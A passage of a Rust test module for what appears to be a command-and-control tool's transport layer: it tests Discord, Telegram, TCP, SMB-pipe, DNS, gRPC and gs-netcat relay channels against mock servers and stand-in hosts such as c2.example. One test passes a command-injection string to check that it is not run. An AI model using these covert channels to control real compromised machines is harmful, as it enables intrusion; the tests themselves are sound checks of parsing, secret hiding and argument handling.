                .unwrap_or("");
            seen.0.lock().unwrap().push(format!("auth={auth}"));
            seen.0
                .lock()
                .unwrap()
                .push(body["content"].as_str().unwrap_or("").to_owned());
            Json(serde_json::json!({ "id": "own-1" }))
        }
        async fn get_msgs(
            axum::extract::State(seen): axum::extract::State<Seen>,
        ) -> Json<Vec<serde_json::Value>> {
            let posted = seen.0.lock().unwrap()[1].clone();
            Json(vec![
                serde_json::json!({ "id": "own-1", "content": posted }),
                serde_json::json!({ "id": "reply-2", "content": crate::chat::encode_frame(b"REPLY") }),
            ])
        }

        let seen = Seen(Arc::new(Mutex::new(Vec::new())));
        let app = Router::new()
            .route("/channels/chan-1/messages", post(post_msg))
            .route("/channels/chan-1/messages", get(get_msgs))
            .with_state(seen.clone());
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let api = format!("http://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });

        let transport = Transport::from_endpoint("discord://tok@chan-1").unwrap();
        let Transport::Discord {
            client,
            token,
            channel,
            api: t_api,
            cursor,
        } = transport
        else {
            panic!("expected discord transport");
        };
        // Point the transport at the mock API base.
        let reply = discord_exchange(&client, &token, &channel, &api, &cursor, b"REQUEST")
            .await
            .unwrap();
        server.abort();
        let _ = t_api;

        assert_eq!(reply, b"REPLY".to_vec());
        let log = seen.0.lock().unwrap().clone();
        assert_eq!(log[0], "auth=Bot tok");
        assert_eq!(
            crate::chat::decode_frame(&log[1]).unwrap(),
            b"REQUEST".to_vec()
        );
    }

    #[tokio::test]
    async fn telegram_exchange_round_trips_against_a_mock() {
        use axum::routing::get;
        use axum::{Json, Router};
        use std::sync::{Arc, Mutex};

        #[derive(Clone)]
        struct Seen(Arc<Mutex<Vec<String>>>);
        async fn send(
            axum::extract::State(seen): axum::extract::State<Seen>,
            Json(body): Json<serde_json::Value>,
        ) -> Json<serde_json::Value> {
            seen.0
                .lock()
                .unwrap()
                .push(body["text"].as_str().unwrap_or("").to_owned());
            Json(serde_json::json!({ "ok": true, "result": { "message_id": 7 } }))
        }
        async fn updates(
            axum::extract::State(seen): axum::extract::State<Seen>,
        ) -> Json<serde_json::Value> {
            let posted = seen.0.lock().unwrap()[0].clone();
            Json(serde_json::json!({ "ok": true, "result": [
                { "message": { "message_id": 7, "text": posted } },
                { "message": { "message_id": 8, "text": crate::chat::encode_frame(b"TGREPLY") } },
            ]}))
        }

        let seen = Seen(Arc::new(Mutex::new(Vec::new())));
        let app = Router::new()
            .route("/bottok/sendMessage", axum::routing::post(send))
            .route("/bottok/getUpdates", get(updates))
            .with_state(seen.clone());
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let api = format!("http://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });

        let transport = Transport::from_endpoint("telegram://tok@12345").unwrap();
        let Transport::Telegram {
            client,
            token,
            chat_id,
            api: _t,
            cursor,
        } = transport
        else {
            panic!("expected telegram transport");
        };
        let reply = telegram_exchange(&client, &token, &chat_id, &api, &cursor, b"REQ")
            .await
            .unwrap();
        server.abort();

        assert_eq!(reply, b"TGREPLY".to_vec());
        let log = seen.0.lock().unwrap().clone();
        assert_eq!(crate::chat::decode_frame(&log[0]).unwrap(), b"REQ".to_vec());
    }

    #[test]
    fn discord_and_telegram_endpoints_parse() {
        match Transport::from_endpoint("discord://bot@123").unwrap() {
            Transport::Discord { token, channel, .. } => {
                assert_eq!(token, "bot");
                assert_eq!(channel, "123");
            }
            _ => panic!("expected discord"),
        }
        match Transport::from_endpoint("telegram://tok@99").unwrap() {
            Transport::Telegram { token, chat_id, .. } => {
                assert_eq!(token, "tok");
                assert_eq!(chat_id, "99");
            }
            _ => panic!("expected telegram"),
        }
        // Missing @ or empty parts are rejected.
        assert!(Transport::from_endpoint("discord://botonly").is_err());
        assert!(Transport::from_endpoint("telegram://@99").is_err());
    }

    #[test]
    fn scheme_selects_transport() {
        assert!(matches!(
            Transport::from_endpoint("http://h:80").unwrap(),
            Transport::Http { .. }
        ));
        assert!(matches!(
            Transport::from_endpoint("tcp://10.0.0.5:4444").unwrap(),
            Transport::Tcp { .. }
        ));
        assert!(Transport::from_endpoint("gs://localhost:4630").is_err());
        let gs = Transport::from_profile(
            "gs://127.0.0.1:4630",
            Some(GSocketConfig {
                secret: "relay-secret".into(),
                local_port: 4630,
            }),
        )
        .unwrap();
        assert!(matches!(gs, Transport::GSocket { .. }));
        assert_eq!(gs.describe(), "gs://127.0.0.1:4630");
        assert!(!gs.describe().contains("relay-secret"));
        assert!(matches!(
            Transport::from_endpoint("dns://dns.example.com").unwrap(),
            Transport::Dns { .. }
        ));
        assert!(Transport::from_endpoint("ftp://x:1").is_err());
        assert!(Transport::from_endpoint("naked").is_err());
    }

    #[test]
    fn gsocket_command_uses_direct_arguments() {
        let command = gsocket_command(
            std::path::Path::new("/opt/bin/gs-netcat"),
            "relay secret; touch /tmp/nope",
            4630,
        );
        let command = command.as_std();
        assert_eq!(command.get_program(), "/opt/bin/gs-netcat");
        let args = command
            .get_args()
            .map(|arg| arg.to_string_lossy().into_owned())
            .collect::<Vec<_>>();
        assert_eq!(args, ["-s", "relay secret; touch /tmp/nope", "-p", "4630"]);
    }

    #[test]
    fn missing_gsocket_binary_is_reported_without_the_secret() {
        let forward = GSocketForward {
            executable: PathBuf::from("/definitely/missing/gs-netcat"),
            config: GSocketConfig {
                secret: "never-log-this-secret".into(),
                local_port: 4630,
            },
            child: Mutex::new(None),
        };
        let error = forward.ensure_started().unwrap_err();
        assert!(error.contains("/definitely/missing/gs-netcat"));
        assert!(!error.contains("never-log-this-secret"));
    }

    #[test]
    fn smb_endpoint_parsed() {
        if let Transport::Smb {
            host,
            share,
            resource,
        } = Transport::from_endpoint("smb://10.0.0.5/c2/pipe").unwrap()
        {
            assert_eq!(host, "10.0.0.5");
            assert_eq!(share, "c2");
            assert_eq!(resource, "pipe");
        } else {
            panic!("expected Smb");
        }
        // Default resource.
        if let Transport::Smb { resource, .. } =
            Transport::from_endpoint("smb://10.0.0.5/c2").unwrap()
        {
            assert_eq!(resource, "c2.bin");
        } else {
            panic!("expected Smb with default resource");
        }
        assert!(Transport::from_endpoint("smb://").is_err());
    }

    #[test]
    fn tcp_addr_parsed() {
        if let Transport::Tcp { host, port } =
            Transport::from_endpoint("tcp://10.0.0.5:4444").unwrap()
        {
            assert_eq!(host, "10.0.0.5");
            assert_eq!(port, 4444);
        } else {
            panic!("expected Tcp");
        }
    }

    #[test]
    fn frame_has_length_prefix() {
        let body = b"hello".to_vec();
        let f = frame_bytes(&body);
        assert_eq!(u32::from_be_bytes([f[0], f[1], f[2], f[3]]), 5);
        assert_eq!(&f[4..], b"hello");
    }

    #[test]
    fn grpc_endpoints_rewrite_to_a_tonic_uri() {
        // `grpcs://` must not be mangled by the `grpc://` rewrite, which is
        // why the scheme strings are matched with the `://` included.
        let plain = Transport::from_endpoint("grpc://c2.example:50051").unwrap();
        let Transport::Grpc { endpoint, .. } = &plain else {
            panic!("expected grpc transport");
        };
        assert_eq!(endpoint, "http://c2.example:50051");

        let tls = Transport::from_endpoint("grpcs://c2.example:50051").unwrap();
        let Transport::Grpc { endpoint, .. } = &tls else {
            panic!("expected grpc transport");
        };
        assert_eq!(endpoint, "https://c2.example:50051");
        assert_eq!(plain.describe(), "http://c2.example:50051");
    }
}
